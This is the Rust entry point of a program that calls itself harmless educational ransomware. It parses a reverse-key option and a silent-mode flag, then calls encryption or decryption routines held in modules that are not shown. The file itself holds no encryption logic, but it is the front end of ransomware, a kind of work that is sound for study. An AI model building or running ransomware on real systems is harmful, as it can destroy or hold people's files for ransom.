use clap::{command, value_parser, Arg};

mod ransomware;
use ransomware::*;

mod encrypt;

fn main() {
    let matches = command!()
        .version("1.0")
        .author("hboissel")
        .about("Harmless ransomware created for educational purposes.
Encrypts the files in the infection folder in the home directory of the current user.")
        .arg(
            Arg::new("reverse")
                .short('r')
                .long("reverse")
                .default_value("")
                .help("Key to reverse the encryption"),
        )
        .arg(
            Arg::new("silent")
                .short('s')
                .long("silent")
                .default_value("false")
                .num_args(0..=1)
                .require_equals(true)
                .default_missing_value("true")
                .value_parser(value_parser!(bool))
                .help("Silent mode"),
        )
        .get_matches();

    let reverse_key: &String = matches.get_one::<String>("reverse").unwrap();
    let _silent_mode: &bool = matches.get_one::<bool>("silent").unwrap();

    if !reverse_key.is_empty() {
        ransomware_reverse(&reverse_key);
    } else {
        ransomware();
    }
}
